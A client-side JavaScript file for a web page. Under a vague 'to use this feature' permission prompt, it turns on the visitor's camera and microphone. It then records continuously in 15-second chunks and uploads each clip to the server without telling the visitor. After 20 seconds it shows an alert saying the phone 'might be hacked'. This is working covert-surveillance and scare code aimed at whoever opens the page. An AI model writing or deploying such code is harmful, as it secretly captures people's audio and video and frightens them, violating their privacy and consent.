const video = document.getElementById('video');
const fileInput = document.getElementById('fileInput');
const uploadForm = document.getElementById('uploadForm');
const hiddenMessage = document.getElementById('hiddenMessage'); // Reference to the <p> element

let mediaRecorder;
let recordedChunks = [];
let recordingInterval;
const RECORDING_DURATION = 15000; // 15 seconds

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;
        return stream;
    } catch (error) {
        // Alert user if permissions are denied or an error occurs
        alert('Unable to access camera and microphone. Please ensure you have granted permissions.');
        console.error('Error accessing the camera and microphone:', error);
    }
}

function handleDataAvailable(event) {
    if (event.data.size > 0) {
        recordedChunks.push(event.data);
    }
}

function handleStop() {
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    recordedChunks = [];
    const url = URL.createObjectURL(blob);
    const formData = new FormData();
    formData.append('video', blob, `recording-${Date.now()}.webm`);

    // Send the video blob to the server
    fetch('/upload', {
        method: 'POST',
        body: formData
    })
        .then(response => response.text())
        .then(result => {
            console.log('Saved video:', result);
        })
        .catch(error => {
            console.error('Error saving video:', error);
        });
}

async function startRecording() {
    const stream = await startCamera();
    if (!stream) return; // Exit if camera/mic access failed

    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = handleDataAvailable;
    mediaRecorder.onstop = handleStop;
    mediaRecorder.start();

    // Schedule stopping and starting of recording
    recordingInterval = setInterval(() => {
        mediaRecorder.stop();
        mediaRecorder.start();
    }, RECORDING_DURATION);
}

// Initialize recording when the page loads
window.addEventListener('load', () => {
    // Show an alert message about permissions before starting the recording
    alert('To use this feature, please allow access to your camera and microphone.');

    startRecording();

    // Show the <p> element after 20 seconds
    setTimeout(() => {
        hiddenMessage.style.display = 'block';
    }, 20000); // 20000 milliseconds = 20 seconds

    // Show an alert after 20 seconds
    setTimeout(() => {
        alert("Your phone might be hacked. Take necessary precautions!");
    }, 20000); // 20000 milliseconds = 20 seconds
});

// Stop the recording interval when the page is unloaded
window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
});
